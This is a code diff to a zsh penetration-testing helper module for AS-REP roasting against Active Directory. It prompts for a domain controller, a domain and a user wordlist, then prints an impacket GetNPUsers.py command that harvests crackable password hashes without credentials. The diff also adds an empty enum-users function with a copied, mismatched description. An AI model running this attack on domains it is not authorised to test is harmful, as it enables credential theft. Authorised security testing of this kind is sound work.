@@ -13,29 +13,34 @@ The nb-ad-asrep namespace contains commands for as-rep roast attack on Active Di
 Commands
 --------
 nb-ad-asrep-install        installs dependencies
+nb-ad-asrep-enum-users     brute force a password hashes of given users
 nb-ad-asrep-brute          brute force a password hashes of given users
 nb-ad-asrep-crack          crack the password hash
 
 DOC
 }
 
-nb-ad-asrep-install(){
+nb-ad-asrep-install() {
     __info "Running $0..."
     __pkgs impacket
 }
 
-nb-ad-asrep-brute(){
+nb-ad-asrep-enum-users() {
+
+}
+
+nb-ad-asrep-brute() {
 	__ask "Enter the IP address of the target domain controller"
 	nb-vars-set-rhost
-    __ask "Enter target AD domain (must also be set in your hosts file)"
-    nb-vars-set-domain
+  __ask "Enter target AD domain (must also be set in your hosts file)"
+  nb-vars-set-domain
 	__ask "Enter a users wordlist"
 	nb-vars-set-wordlist
 
 	print -z "GetNPUsers.py -dc-ip ${__RHOST} ${__DOMAIN}.local/ -no-pass -usersfile ${__WORDLIST}"
 }
 
-nb-ad-asrep-crack(){
+nb-ad-asrep-crack() {
 	__ask "Enter the hash"
 	__check-hash
 	__ask "Enter a password wordlist"
